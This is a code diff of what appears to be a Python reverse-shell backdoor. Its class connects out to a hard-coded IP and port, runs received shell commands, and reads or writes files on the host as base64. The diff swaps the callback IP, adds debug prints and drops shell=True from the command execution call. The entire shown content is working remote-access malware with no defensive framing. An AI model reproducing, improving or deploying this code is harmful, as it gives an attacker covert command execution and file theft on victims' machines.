@@ -1,7 +1,7 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 import socket , subprocess, json, os, base64,sys,shutil,requests
 
-IP = "192.168.1.95".encode('utf-8') # change this
+IP = "192.168.1.72".encode('utf-8')  # change this
 PORT = 4445 # change this (Integer Only)
 class MotherFucker():
     def __init__(self, ip, port):
@@ -37,17 +37,19 @@ class MotherFucker():
         #Gets file from client and writes it to hard drive
         with open(path, "wb") as file:
             decoded_file = base64.b64decode(content)
+            print (decoded_file)
             file.write(decoded_file)
             return "Uploaded Successfully !"
     def read_file(self, path):
         #Gets file from hard drive and sends it to Client :)
         with open(path, "rb") as file:
             encoded_file = base64.b64encode(file.read())
+            print (encoded_file)
             return encoded_file
     def execute_system_command(self, command):
         #used check_output instead of call or run or whatever else cause it actualy sends the result of command back and we can see it in Client
         try:
-            return subprocess.getoutput(command, shell=True)
+            return subprocess.getoutput(command)
         except Exception as e:
             print(e)
             pass
